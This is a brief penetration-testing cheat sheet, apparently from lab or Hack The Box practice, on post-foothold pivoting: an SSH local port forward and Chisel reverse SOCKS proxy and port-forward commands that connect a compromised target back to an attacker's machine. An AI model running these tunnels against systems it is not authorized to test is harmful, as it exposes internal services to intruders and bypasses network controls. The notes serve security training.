# Tunneling and Port Forwarding

## SSH

### Port Forwarding

Scenario: When getting a foothold on a target machine, you find a service running on it that is only listening on the local host, so you want to forward it to the Attack machine so you can access it.

```bash
# From Kali (Attack Machine)
# Syntax
ssh -L <local port>:<localhost>:<target port> -l <target user> <target IP>
# Example (from the Pandora machine on HTB)
ssh -L 8888:127.0.0.1:80 -l daniel 10.129.250.50
```

## Chisel

### Socks Proxy

```bash
# From Kali
chisel server -p 8000 --reverse

# From Target - Download necessary platform binary i.e Linux adm64, Windows, etc.
./chisel client 10.50.143.31:8000 R:socks

# And now use proxychains with port 1080 (default)
```

### Port Forwarding

Scenario: When getting a foothold on a target machine, you find a service running on port 8000 that is only listening on the local host, so you want to forward it to the Attack machine (also to port 8000) so you can access it.

```bash
# From kali
chisel server -p 12312 --reverse

# From Target
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:8000:127.0.0.1:8000
```
